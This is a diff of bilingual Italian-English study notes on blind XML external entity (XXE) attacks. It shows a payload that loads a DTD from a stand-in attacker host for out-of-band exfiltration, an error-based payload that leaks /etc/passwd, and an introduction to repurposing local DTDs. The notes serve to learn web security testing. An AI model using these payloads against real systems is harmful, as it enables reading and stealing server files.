@@ -107,11 +107,8 @@ attacker host -> http://web-attacker.com/malicious.dtd
 
 payload da submittare all'applicazione -> 
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
-
-
-            
+         
 Note:          
-
 This technique might not work with some file contents, including the newline characters contained in the /etc/passwd
 file. This is because some XML parsers fetch the URL in the external 
 entity definition using an API that validates the characters that are 
@@ -119,7 +116,18 @@ allowed to appear within the URL. In this situation, it might be
 possible to use the FTP protocol instead of HTTP. Sometimes, it will not
 be possible to exfiltrate data containing newline characters, and so a 
 file such as /etc/hostname can be targeted instead.
-            
 
-        
+
+BLIND XXE VIA ERROR MESSAGES
+
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+
+nell'errore appare il testo del file dichiarato nella prima entity
+
+Exploiting blind XXE by repurposing a local DTD
+so what quando le out of bound connections sono chiuse e non è possibile caricare un DTD da un server remoto? in questo caso è possibile triggerare un loophole error message
+If a document's DTD uses a hybrid of internal and external DTD declarations, then the internal DTD can redefine entities that are declared in the external DTD. 
             
